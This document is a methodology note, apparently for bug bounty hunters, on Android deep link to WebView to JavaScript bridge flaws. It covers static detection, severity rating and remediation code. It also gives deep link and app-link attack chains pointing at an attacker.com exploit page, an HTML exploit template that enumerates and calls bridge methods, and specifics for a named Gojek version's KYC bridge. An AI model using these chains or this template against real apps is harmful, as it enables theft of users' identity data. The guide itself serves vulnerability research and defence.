# Deep Link → WebView → JavaScript Bridge Attacks

## Overview

A common critical vulnerability pattern in Android apps where:
1. An exported deep link handler accepts a `url` parameter
2. The URL is loaded in a WebView with JavaScript enabled
3. The WebView has `addJavascriptInterface()` exposing sensitive native methods
4. No URL validation/whitelist is applied before loading

This gives an attacker full access to the JavaScript bridge from any page they control.

## Detection (Static Analysis)

### Step 1: Find deep link handlers that accept URL parameters

```bash
# Search for deep link annotations with web/url patterns
grep -rn "@DeepLink\|@DeepLinkHandler" sources/ | grep -i "web\|url"

# Search for intent-filter with BROWSABLE + custom scheme
grep -B5 -A10 'android.intent.category.BROWSABLE' AndroidManifest.xml

# Find URL extraction from deep link bundles
grep -rn 'bundle.getString("url")\|getStringExtra("url")\|getQueryParameter("url")' sources/
```

### Step 2: Check for URL validation

Look for these patterns BETWEEN url extraction and WebView loading:
- Domain whitelist check (`contains("trusted.com")`, regex match)
- Scheme validation (`startsWith("https://")`)
- `shouldOverrideUrlLoading()` with domain check
- URL parsing + host comparison

**If none found → vulnerable.**

### Step 3: Map the JavaScript bridge

```bash
# Find all @JavascriptInterface methods
grep -rn "@JavascriptInterface" sources/ | grep -v "test\|example"

# Find addJavascriptInterface calls
grep -rn "addJavascriptInterface" sources/

# Map the bridge class
# The second argument to addJavascriptInterface is the JS-accessible name
```

### Step 4: Assess bridge method impact

Categorize exposed methods by risk:
- **Critical:** File I/O, exec, native calls, token/credential access
- **High:** KYC/identity data, payment operations, consent submission
- **Medium:** Navigation, UI manipulation, analytics
- **Low:** Logging, version info

## Attack Chains

### Chain 1: Direct deep link (requires app installed)
```
gojek://gocore/web?url=https://attacker.com/exploit.html
```

### Chain 2: HTTPS app link (clickable from browser/messaging)
```
https://gojek.link/gocore/web?url=https://attacker.com/exploit.html
```
Many apps convert verified HTTPS app links to internal deep links via string replacement. This makes the attack deliverable via any messaging platform.

### Chain 3: Firebase Dynamic Link wrapper
```
https://app.page.link/?link=scheme://gocore/web?url=https://attacker.com
```
Firebase Dynamic Links resolve to the inner link, adding another layer of legitimacy.

### Chain 4: QR code
Encode any of the above in a QR code for physical-world attacks.

## Exploit Page Template

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// Enumerate available bridge methods
function enumBridge(bridgeName) {
    var bridge = window[bridgeName];
    if (!bridge) { document.write("Bridge not found: " + bridgeName); return; }
    var methods = [];
    for (var prop in bridge) {
        if (typeof bridge[prop] === 'function') {
            methods.push(prop);
        }
    }
    document.write("<h2>" + bridgeName + " methods:</h2><ul>");
    methods.forEach(function(m) { document.write("<li>" + m + "</li>"); });
    document.write("</ul>");
}

// Call a specific method
function callBridge(bridgeName, methodName, args) {
    var bridge = window[bridgeName];
    if (!bridge || !bridge[methodName]) return "Method not found";
    return bridge[methodName].apply(bridge, args);
}

// Example: enumerate OneKycAndroidInterface
enumBridge("OneKycAndroidInterface");

// Example: extract user data
// OneKycAndroidInterface.getOneKycUserDetails("callback_id", "param1", "param2");
</script>
</body>
</html>
```

## Real-World Examples

### Gojek v5.61.1 (2026)
- **Entry:** `gojek://gocore/web?url=X` and `gojek://gocore/third_party_web?url=X`
- **Handler:** `ThirdPartyProductDeeplinkHandlerKt.handleThirdPartyWebDeeplink()`
- **Validation:** NONE — `bundle.getString("url")` passed directly to `getWebActivity()`
- **Bridge:** `OneKycAndroidInterface` with 11 methods (KYC data, consent, facial recognition)
- **HTTPS chain:** `https://gojek.link/gocore/web?url=X` auto-converts to internal deep link
- **Impact:** Phishing in app context, KYC data theft, consent manipulation

### Common Patterns in Fintech/Super Apps
- Deep link routers using annotation-based dispatch (`@DeepLink`, Airbnb DeepLinkDispatch)
- WebView activities named `*WebActivity`, `*WebViewActivity`, `*BrowserActivity`
- URL parameter names: `url`, `web_url`, `redirect_url`, `target_url`, `link`
- Bridge names: `AndroidBridge`, `NativeBridge`, `AppBridge`, `*Interface`

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| No URL validation + sensitive bridge methods (payment, KYC, auth) | Critical |
| No URL validation + non-sensitive bridge (UI, navigation) | High |
| Weak validation (bypassable regex) + sensitive bridge | High |
| No URL validation + no bridge (phishing only) | Medium |
| Proper domain whitelist + bridge | Low (if whitelist is correct) |

## Remediation Patterns

1. **URL whitelist (strongest):**
```java
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "www.gojek.com", "gopay.co.id", "kyc.gojek.com"
);

if (!ALLOWED_HOSTS.contains(Uri.parse(url).getHost())) {
    // Reject — open in external browser instead
    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
    return;
}
```

2. **Conditional bridge registration:**
```java
// Only add bridge for trusted origins
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        if (isTrustedOrigin(url)) {
            view.addJavascriptInterface(bridge, "BridgeName");
        } else {
            view.removeJavascriptInterface("BridgeName");
        }
    }
});
```

3. **Origin check in bridge methods:**
```java
@JavascriptInterface
public void sensitiveMethod(String param) {
    String currentUrl = webView.getUrl();
    if (!isTrustedOrigin(currentUrl)) {
        Log.w(TAG, "Bridge call from untrusted origin: " + currentUrl);
        return;
    }
    // Proceed with sensitive operation
}
```

## Bug Bounty Submission Notes

- This class of vulnerability is submittable with **static code evidence alone** when the code path is unambiguous (no validation between URL extraction and WebView load)
- Include: decompiled source showing no validation, bridge class with @JavascriptInterface methods, manifest showing exported deep link handler
- Dynamic PoC strengthens the report but isn't required if code path is clear
- For HTTPS app link chains, note that the attack is deliverable via WhatsApp/SMS/email (increases impact)
- Map the full chain: user clicks link → app opens → WebView loads attacker page → bridge methods accessible
